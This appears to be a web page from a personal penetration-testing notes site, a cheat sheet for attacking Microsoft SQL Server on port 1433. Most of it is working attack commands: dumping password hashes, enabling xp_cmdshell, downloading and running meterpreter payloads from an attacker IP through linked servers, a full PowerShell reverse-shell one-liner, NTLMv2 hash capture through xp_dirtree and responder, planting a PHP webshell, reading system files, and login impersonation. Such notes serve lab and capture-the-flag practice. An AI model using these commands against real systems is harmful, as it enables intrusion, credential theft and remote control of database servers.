<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="notion-container">
        <div class="notion-header">
            <h1>Microsoft SQL Server (TCP/1433)</h1>
            <p>Database system developed by Microsoft</p>
        </div>
        <div class="notion-body">
            <h2>Information</h2>
            <ul>
                <li>Useful users: dbo</li>
                <li>Useful roles: sysadmin, securityadmin</li>
                <li>Useful permissions: IMPERSONATE</li>

                <p>Description about databases</p>
                <li><b>master</b>	Tracks all system information for an SQL server instance</li>
                <li><b>model</b>	Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database</li>
                <li><b>msdb</b>	The SQL Server Agent uses this database to schedule jobs & alerts</li>
                <li><b>tempdb</b>	Stores temporary objects</li>
                <li><b>resource</b>	Read-only database containing system objects included with SQL server</li> 
            </ul>

            <h2>Usage</h2>
            <h3> Connect to DB </h3>
            <ul>
                <p> You must have impacket suit installed (/examples directory)</p>
                <pre><code class="language-bash">mssqlclient.py user:password@IP_VICTIM</code></pre>
                <p>In case the user you are using is not present in MSSQL SRV users you can use a domain authentication using the the flag...</p>
                <pre><code class="language-bash">mssqlclient.py user:password@IP_VICTIM -windows-auth</code></pre>
                <p>In case you are peroforming the connection from a Windows you could do</p>
                <pre><code class="language-cmd">sqlcmd -S 10.129.20.13 -U username -P Password123</code></pre>
                

            </ul>

            <h3>Useful commands</h3>
            <ul>
                <p>Get version</p>
                <pre><code class="language-sql">SELECT @@version;</code></pre>

                <p>Current user and check if admin</p>
                <pre><code class="language-sql">SELECT SYSTEM_USER; SELECT USER_NAME(); SELECT IS_SRVROLEMEMBER('sysadmin');</code></pre>

                <p>List databases</p>
                <pre><code class="language-sql">SELECT name FROM master.dbo.sysdatabases;</code></pre>

                <p>List tables from a current database</p>
                <pre><code class="language-sql">SELECT table_name FROM information_schema.tables;</code></pre>
                
                <p>List server users</p>
                <pre><code class="language-sql">SELECT name FROM master.sys.syslogins;</code></pre>

                <p>Dump credentials</p>
                <pre><code class="language-sql">SELECT name, password_hash FROM sys.sql_logins;</code></pre>

                <p>Show linked servers</p>
                <pre><code class="language-sql">EXEC sp_linkedservers;</code></pre>
                <pre><code class="language-sql">SELECT srvname, isremote FROM sysservers #1 means remote</code></pre>

                <p>Execute commands in linked server (Check which user you are)</p>
                <pre><code class="language-sql">EXEC ('SELECT SYSTEM_USER, USER_NAME()') AT [DC02.darkzero.ext];</code></pre>
                <p>In case you are DBO you could try to gain a shell. First generate the .exe file</p>
                <pre><code class="language-sql">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.94 LPORT=4444 -f exe -o shell.exe</code></pre>
                <p>Acquire it from the server through the linked server</p>
                <pre><code class="language-sql">EXEC ('EXEC xp_cmdshell ''certutil -urlcache -split -f "http://10.10.15.94:8000/shell.ps1" "C:/shell.ps1"''') AT [LOCAL.TEST.LINKED.SRV];</code></pre>
                <p>From your side listen and execute from the server side</p>
                <pre><code class="language-sql">EXEC ('EXEC xp_cmdshell ''certutil -urlcache -split -f "http://10.10.15.94:8000/shell.exe" "C:/shell.exe"''') AT [LOCAL.TEST.LINKED.SRV];</code></pre>


                <pre><code class="language-sql">EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];</code></pre>
            </ul>


            <h2>Enumeration</h2>
            <ul>
                <p>Files that may contain credentials</p>
                <pre><code class="language-bash">sql-Configuration.INI</code></pre>
            </ul>

            <h2> Exploitation </h2>
            <ul>
            <h3>NTLMv2 capture and crack</h3>
            <p>From the MSSQL SRV you can perform a SMB connection to a controlled share in orde to capture the hash NTLMv2 and then crack it locally</p>
            <ul>
                <p>Open a smb share</p>
                <pre><code class="language-sql">impacket-smbserver share .</code></pre>    
                <p>Open responder</p>
                <pre><code class="language-sql">responder -I tun0</code></pre>
                <p>Perform connection from MSSQL SRV </p>
                <pre><code class="language-sql">EXEC xp_dirtree '\\10.10.14.17\share';</code></pre>
                <p>Capture hash and crack it using hashcat</p>
            </ul>     

             <h3>OS Command execution</h3> 
             <ul>  
                <h4> Configuration to execute commands from BBDD system</h4>

                <pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;</code></pre>
                <b>You can alternativelly use the metasploit module "exploit/windows/mssql/mssql_payload" and gather a meterpreter shell</b>    


                <h4> Reverse Socket connection </h4>
                <ul>
                <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.18'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"';</code></pre>
                <p>It is highly recomended to capture it using metasploit. Check this out</p>
                <p>Generate meterpreter payload and encode it</p>
                <pre><code class="language-sql">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.94 LPORT=4444 -f exe -o shell.exe</code></pre>
                <p>Keep this part from the payload</p>
                <pre><code class="language-sql">powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAH...</code></pre>    
                <p>Perform connection from mssql srv. Have in mind that there is a link statement at the end. It is not necessary always</p>
                <pre><code class="language-sql">EXEC ('EXEC xp_cmdshell ''powershell -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgB...''') AT [DC02.darkzero.ext]</code></pre>    
                <p>Capture the connection using plugin exploit/multi/handler</p>
                </ul>
            </ul>

            <h3>File write</h3> 
             <ul>  
                <p>To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p>
                <pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'Ole Automation Procedures', 1
RECONFIGURE;</code></pre>
                <p>Now you can start creating a file</p>
                <pre><code class="language-sql">DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET["c"]);?&gt;'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE</code></pre>
            <b>Just a quote. 8 means open the file to append and 1 creates the file if not exists</b>        
            </ul>

            <h3>File read</h3> 
             <ul>  
                <p>In case you have enough permissions to read files we can perform the following methods:</p>
                <pre><code class="language-sql">SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</code></pre>
            </ul>

            
            

            <h3>User Impersonation</h3> 
             <ul>  
                <h4>Using the following query you are able to check if you can IMPERSONATE any user</h4>
                <pre><code class="language-sql">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'</code></pre>
                <p>In case you found a user. Execute the following to impersonate</p>
                <p>Remember that in case you are impersonating a username which does not have access to the database you are using this will fail. It is recomended to use master database since all users have access there</p>
                <pre><code class="language-sql">EXECUTE AS LOGIN = '$USERNAME'</code></pre>
                <p>Check that you are impersonating the right user
                <pre><code class="language-sql">SELECT SYSTEM_USER</code></pre>
            </ul>
            </ul>
        </div>
    </div>


</body>
</html>